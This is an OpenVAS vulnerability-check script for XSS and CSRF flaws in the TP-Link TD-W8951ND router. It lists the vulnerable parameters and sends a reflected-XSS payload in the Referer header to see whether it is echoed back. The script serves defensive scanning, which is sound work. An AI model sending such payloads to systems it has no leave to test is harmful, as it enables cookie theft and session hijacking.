###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tplink_tdw8951nd_xss_n_csrf_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# TP-Link TD-W8951ND XSS and CSRF Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803752");
  script_version("$Revision: 11401 $");
  script_bugtraq_id(62103);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-09-03 13:14:17 +0530 (Tue, 03 Sep 2013)");
  script_name("TP-Link TD-W8951ND XSS and CSRF Vulnerabilities");

  script_tag(name:"summary", value:"This host is running TP-Link TD-W8951ND and is prone to cross site scripting
  and cross site request forgery vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP request and check whether it is able to read
  the cookie or not.");

  script_tag(name:"solution", value:"Firmware update is available.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"insight", value:"Multiple flaws are due to,

  - Input passed to the 'Referer' header in HTTP request is not properly
   sanitised before being returned to the user.

  - Input passed to the 'wlanWEBFlag', 'AccessFlag', 'wlan_APenable' parameter
   in '/Forms/home_wlan_1' is not properly sanitised before being returned to
   the user.

  - Input passed to the 'PingIPAddr' parameter in '/Forms/tools_test_1' is not
   properly sanitised before being returned to the user.");

  script_tag(name:"affected", value:"TP-Link TD-W8951ND Firmware 4.0.0 Build 120607, Other versions may also be
  affected.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary script
  code in the browser of an unsuspecting user in the context of the affected site.");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/123016");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/tp-link-td-w8951nd-cross-site-request-forgery-cross-site-scripting");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TD-W8951ND/banner");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

banner = get_http_banner(port: http_port);
if(banner && 'WWW-Authenticate: Basic realm="TD-W8951ND"' >!< banner){
  exit(0);
}

host = http_host_name(port:http_port);

req = string("GET /doesnotexists HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             'Referer: http://pwned"><script>alert(document.cookie)</script>', '\r\n',
             'Connection: keep-alive', '\r\n\r\n');

res = http_keepalive_send_recv(port:http_port,data:req);

if(res =~ "HTTP/1\.. 200" && "RomPager server" >< res &&
   "><script>alert(document.cookie)</script>" >< res)
{
  security_message(http_port);
  exit(0);
}

exit(99);
